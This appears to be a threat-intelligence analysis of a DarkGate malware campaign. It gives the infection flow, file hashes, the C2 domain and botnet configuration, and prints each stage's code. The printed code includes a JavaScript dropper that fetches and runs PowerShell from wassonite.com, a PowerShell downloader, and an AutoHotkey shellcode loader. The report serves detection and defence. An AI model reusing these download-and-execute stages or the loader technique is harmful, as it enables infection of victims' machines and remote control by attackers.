THREAT IDENTIFICATION: DARKGATE LOADER

INFECTION FLOW
xlsx -> js file -> powershell scripts -> AutoHotKey download and launch -> injection -> C2

XLSX FILE HASHES
4_10_AC-2335.xlsx
7efe9f3902618e160caafb1f6fd73dd6
SHA1: 8f1a3560307e848a01122d088d9136e545726ca8

XLSX FILE METADATA
Author: ivcordsh
Last Modified By: admin

JAVASCRIPT FILE DOWNLOAD URL
file:///\\5.180.24.155\azure\EXCEL_DOCUMENT_OPEN.JS..........

JAVASCRIPT FILE HASH
EXCEL_DOCUMENT_OPEN.js
299cd4b4a7538e5a3aff97990522020c
SHA1: 637b17432cf9c8620284fca2356e472ccda61be2

RELEVANT JAVASCRIPT FILE CONTENTS
wbbrnkg();
function wbbrnkg(){
new ActiveXObject("WScript.Shell").Popup("", 1, "", 16);
vsfbinpv = "powershell.exe -Command Invoke-Expression (Invoke-RestMethod -Uri wassonite.com/yrqnsfla)";
new ActiveXObject("WScript.Shell").Run(vsfbinpv, 0, true);
WScript.Quit(0);
}

INTERCEPTED POWERSHELL CALL
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command Invoke-Expression (Invoke-RestMethod -Uri wassonite.com/yrqnsfla)

DOWNLOADED POWERSHELL SCRIPT FILE URL
http://wassonite.com/yrqnsfla

DOWNLOADED POWERSHELL SCRIPT FILE HASH
yrqnsfla
628058107a371a4e5071ff7213507e8b
SHA1: 769c4a2a7ca3f95daaf998256663f0bf1eb53929

CONTENTS OF POWERSHELL SCRIPT
ni 'C:/ciie/' -Type Directory -Force;cd 'C:/ciie/';Invoke-WebRequest -Uri "http://wassonite.com/ctekbgrbyt" -OutFile 'C:/ciie/temp_AutoHotkey.exe';[System.IO.File]::WriteAllBytes("C:/ciie/AutoHotkey.exe",([System.IO.File]::ReadAllBytes("C:/ciie/temp_AutoHotkey.exe")[1024..([System.IO.File]::ReadAllBytes("C:/ciie/temp_AutoHotkey.exe").Length-1)]));Invoke-WebRequest -Uri "http://wassonite.com/firqwthw" -OutFile 'C:/ciie/script.ahk';Invoke-WebRequest -Uri "http://wassonite.com/xztklipn" -OutFile 'C:/ciie/test.txt'; start 'C:/ciie/AutoHotkey.exe' -a 'C:/ciie/script.ahk';attrib +h 'C:/ciie/'

AUTOHOTKEY SCRIPT COMPONENTS DOWNLOAD URLS
http://wassonite.com/ctekbgrbyt
(Saved as: 'C:/ciie/temp_AutoHotkey.exe')

http://wassonite.com/firqwthw
(Saved as: 'C:/ciie/script.ahk')

http://wassonite.com/xztklipn
(Saved as: 'C:/ciie/test.txt')

AUTOHOTKEY COMPONENT FILE HASHES
ctekbgrbyt
e1bcbdb9af89171679f4ee48a5cf866e
SHA1: 890f5874be1f22fa9ac142e42c10096adb95689d

firqwthw
a2f4ba569825d00dbbb62fd64104e0e3
SHA1: 45687aac5b0031d2063c466fa3fee6f813e92441

xztklipn
dcb6148e6a4d5c89ab44a23b4edebeeb
SHA1: 542839b03a18f57efe10dc318d8947a31a3ee61a

AUTOHOTKEY SCRIPT FILE CONTENTS
#NoTrayIcon
wnpqvjvk := 0x1000
xrpcxgmw := 0x2000
vcphpfed := 0x40
klzofban := A_ScriptDir . "\test.txt"
FileRead, mhcjrojx, %klzofban%
size := 473103
obdjfjse := DllCall("VirtualAlloc", "Ptr", 0, "UInt", size, "UInt", wnpqvjvk | xrpcxgmw, "UInt", vcphpfed)
Loop, % size {
zbjpuixf := "0x" . SubStr(mhcjrojx, 2 * A_Index - 1, 2)
NumPut(zbjpuixf, obdjfjse + (A_Index - 1), "Char")
}
DllCall(obdjfjse)

BOTNET INFO
Botnet ID: admin888
Campaign: edr3

DARKGATE C2s
POST http://wassonite.com/

DARKGATE CONFIGURATION PULLED FROM MEMORY
DOMAINS=wassonite.com|
EPOCH=1712767506
0=wassonite.com|
8=No
11=DarkGate
12=R0ijS0qCVITtS0e6xeZ
13=6
14=Yes
15=80
1=Yes
32=No
3=Yes
4=No
18=50
6=Yes
7=No
19=4000
5=No
21=No
22=No
23=No
31=Yes
24=edr3
25=admin888
26=No
27=jdfEdKYT
28=No
29=2
tabla=F"5 w9*&Vr3apjz,IxZSmAgh}HCGN)i.QET40bctsKe6f7O2$qP{XL]dvn1DlWYkJoB(8Uu[yM=R


